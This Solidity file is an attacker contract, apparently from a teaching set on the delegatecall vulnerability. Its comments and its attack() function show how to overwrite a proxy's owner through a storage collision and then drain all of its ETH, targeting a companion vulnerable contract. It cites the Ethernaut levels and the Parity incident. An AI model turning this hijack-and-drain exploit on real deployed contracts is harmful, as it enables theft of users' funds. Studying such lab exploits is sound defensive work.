// SPDX-License-Identifier: MIT
// Vulnerability: Delegatecall
// File: ATTACKER contract — proves the exploit works
// ══════════════════════════════════════════════════
pragma solidity ^0.8.28;

import "./VulnerableDelegatecall.sol";

// ─────────────────────────────────────────────────────────────────────────────
// ATTACK WALKTHROUGH
//
// The proxy exposes an execute() function that delegatecalls arbitrary
// data into the logic contract. The logic contract has a pwn(address)
// function that writes slot 0. Slot 0 in the proxy is owner.
//
// Two-step attack:
//
//   Step 1 — hijack owner via storage collision
//     Call proxy.execute(abi.encodeWithSignature("pwn(address)", attacker))
//     LogicContract.pwn() runs in proxy's storage context
//     Writes attacker address to slot 0
//     Proxy.owner is now the attacker
//
//   Step 2 — drain funds using stolen ownership
//     Call proxy.withdraw() — onlyOwner now passes for attacker
//     All ETH transferred to attacker
//
// This is the same mechanic behind the Ethernaut Delegation challenge
// (Level 6) and Preservation challenge (Level 16), and structurally
// the same issue that caused the Parity freeze in November 2017.
// ─────────────────────────────────────────────────────────────────────────────

/// @title AttackerDelegatecall
/// @notice Exploits storage collision to steal ownership then drain the vault
contract AttackerDelegatecall {

    VulnerableDelegatecall public target;
    address                public owner;

    constructor(address _target) {
        target = VulnerableDelegatecall(payable(_target));
        owner  = msg.sender;
    }

    /// @notice Execute the full storage collision attack
    function attack() external {
        require(msg.sender == owner, "not owner");

        // step 1 — overwrite proxy.owner via delegatecall storage collision
        // encode a call to LogicContract.pwn(address(this))
        // when proxy delegatecalls this, LogicContract writes slot 0
        // slot 0 in proxy = owner → we become the owner
        bytes memory payload = abi.encodeWithSignature(
            "pwn(address)",
            address(this)
        );
        target.execute(payload);

        // verify we are now the owner
        require(target.owner() == address(this), "ownership hijack failed");

        // step 2 — drain the vault now that we own it
        target.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}

}
